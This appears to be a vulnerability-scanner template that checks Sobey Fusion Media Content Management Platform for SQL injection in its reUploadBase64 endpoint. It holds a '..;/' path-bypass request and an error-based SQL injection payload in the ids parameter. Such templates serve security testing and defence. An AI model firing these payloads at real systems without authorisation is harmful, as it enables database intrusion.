id: poc-yaml-sobey-imcmp-reuploadbase64-sqli
info:
  name: Sobey Fusion Media Content Management Platform reUploadBase64 SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
http:
  - raw:
      - |
        GET /sobey-mchEditor/js/..;/mch/TestInt/reUploadBase64?ids=1&siteCode=1&token=1 HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "Sobey"
      - type: word
        part: body
        words:
          - '"data":null'
  - raw:
      - |
        GET /sobey-mchEditor/js/..;/mch/TestInt/reUploadBase64?ids=1')+AND+(SELECT+1+FROM+nonexistent_table)--+-&siteCode=1&token=1 HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - "Sobey"
          - "MySQLSyntaxErrorException"
      - type: regex
        part: body
        regex:
          - "Table &#39;[0-9a-zA-Z_]+\\.nonexistent_table&#39;"
